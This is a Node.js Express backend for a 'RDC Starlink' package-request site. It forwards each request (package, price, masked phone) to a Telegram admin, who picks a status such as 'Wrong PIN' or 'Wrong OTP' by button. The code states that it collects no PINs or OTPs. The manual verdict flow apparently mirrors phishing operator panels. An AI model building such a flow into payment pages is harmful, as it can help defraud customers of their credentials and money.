const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const transactions = new Map();
let telegramOffset = 0;
let telegramLoopRunning = false;

const allowedStatuses = new Set([
  "approved",
  "wrong_pin",
  "wrong_otp",
  "insufficient_money",
  "otp_expired"
]);

function makeId() {
  return `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
}

async function telegram(method, body = {}) {
  if (!BOT_TOKEN) {
    throw new Error("TELEGRAM_BOT_TOKEN is not configured");
  }

  const response = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body)
    }
  );

  const data = await response.json();

  if (!response.ok || !data.ok) {
    throw new Error(data.description || `Telegram API error: ${response.status}`);
  }

  return data;
}

function adminKeyboard(transactionId) {
  return {
    inline_keyboard: [
      [
        { text: "Approve", callback_data: `status:approved:${transactionId}` },
        { text: "Wrong PIN", callback_data: `status:wrong_pin:${transactionId}` }
      ],
      [
        { text: "Wrong OTP", callback_data: `status:wrong_otp:${transactionId}` },
        { text: "Insufficient money", callback_data: `status:insufficient_money:${transactionId}` }
      ],
      [
        { text: "OTP expired", callback_data: `status:otp_expired:${transactionId}` }
      ]
    ]
  };
}

async function notifyAdmin(transaction) {
  if (!ADMIN_CHAT_ID) {
    throw new Error("TELEGRAM_CHAT_ID is not configured");
  }

  const text =
    `RDC Starlink request\\n\\n` +
    `Request ID: ${transaction.id}\\n` +
    `Package: ${transaction.packageName}\\n` +
    `Validity: ${transaction.validity}\\n` +
    `Price: $${transaction.price}\\n` +
    `Phone: ${transaction.phoneMasked}\\n\\n` +
    `Choose an action below.`;

  return telegram("sendMessage", {
    chat_id: ADMIN_CHAT_ID,
    text,
    reply_markup: adminKeyboard(transaction.id)
  });
}

app.get("/", (req, res) => {
  res.json({
    status: "online",
    service: "RDC Starlink Telegram backend",
    message: "Backend is running successfully."
  });
});

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    telegramConfigured: Boolean(BOT_TOKEN && ADMIN_CHAT_ID)
  });
});

/*
  Creates a transaction for the website.

  IMPORTANT:
  The server deliberately does NOT accept, store, or send customer PINs
  or OTP codes. Those are sensitive authentication credentials.
*/
app.post("/api/requests", async (req, res) => {
  try {
    const { packageName, validity, price, phone } = req.body || {};

    if (!packageName || !validity || price === undefined || !phone) {
      return res.status(400).json({
        error: "packageName, validity, price and phone are required"
      });
    }

    const digits = String(phone).replace(/\D/g, "");

    const transaction = {
      id: makeId(),
      packageName: String(packageName),
      validity: String(validity),
      price: String(price),
      phoneMasked:
        digits.length >= 4
          ? `${"*".repeat(Math.max(0, digits.length - 4))}${digits.slice(-4)}`
          : "****",
      status: "pending",
      createdAt: new Date().toISOString()
    };

    transactions.set(transaction.id, transaction);

    try {
      await notifyAdmin(transaction);
    } catch (telegramError) {
      transactions.delete(transaction.id);
      console.error("Telegram notification failed:", telegramError.message);
      return res.status(502).json({
        error: "Could not notify Telegram admin"
      });
    }

    res.status(201).json({
      requestId: transaction.id,
      status: transaction.status
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/api/requests/:id", (req, res) => {
  const transaction = transactions.get(req.params.id);

  if (!transaction) {
    return res.status(404).json({ error: "Request not found" });
  }

  res.json({
    requestId: transaction.id,
    status: transaction.status
  });
});

async function answerCallback(callbackQuery, status, transactionId) {
  const transaction = transactions.get(transactionId);

  if (!transaction) {
    await telegram("answerCallbackQuery", {
      callback_query_id: callbackQuery.id,
      text: "Request no longer exists."
    });
    return;
  }

  transaction.status = status;
  transaction.updatedAt = new Date().toISOString();

  const labels = {
    approved: "Approved",
    wrong_pin: "Wrong PIN",
    wrong_otp: "Wrong OTP",
    insufficient_money: "Insufficient money",
    otp_expired: "OTP expired"
  };

  await telegram("answerCallbackQuery", {
    callback_query_id: callbackQuery.id,
    text: labels[status] || status
  });

  await telegram("editMessageReplyMarkup", {
    chat_id: callbackQuery.message.chat.id,
    message_id: callbackQuery.message.message_id,
    reply_markup: { inline_keyboard: [] }
  });

  await telegram("sendMessage", {
    chat_id: callbackQuery.message.chat.id,
    text:
      `RDC Starlink request ${transaction.id}\\n` +
      `Status: ${labels[status] || status}`
  });
}

async function processUpdates() {
  if (telegramLoopRunning || !BOT_TOKEN) return;
  telegramLoopRunning = true;

  while (true) {
    try {
      const result = await telegram("getUpdates", {
        offset: telegramOffset,
        timeout: 25,
        allowed_updates: ["callback_query"]
      });

      for (const update of result.result || []) {
        telegramOffset = update.update_id + 1;

        const callback = update.callback_query;
        if (!callback || !callback.data) continue;

        // Only the configured admin chat can control requests.
        if (
          String(callback.message?.chat?.id || "") !==
          String(ADMIN_CHAT_ID || "")
        ) {
          await telegram("answerCallbackQuery", {
            callback_query_id: callback.id,
            text: "Not authorized."
          });
          continue;
        }

        const parts = callback.data.split(":");
        if (parts.length !== 3 || parts[0] !== "status") continue;

        const status = parts[1];
        const transactionId = parts[2];

        if (!allowedStatuses.has(status)) continue;

        await answerCallback(callback, status, transactionId);
      }
    } catch (error) {
      console.error("Telegram polling error:", error.message);
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }
}

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
  console.warn(
    "Telegram is not configured. Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in Render Environment."
  );
} else {
  processUpdates();
}

app.listen(PORT, () => {
  console.log(`RDC Starlink backend running on port ${PORT}`);
});
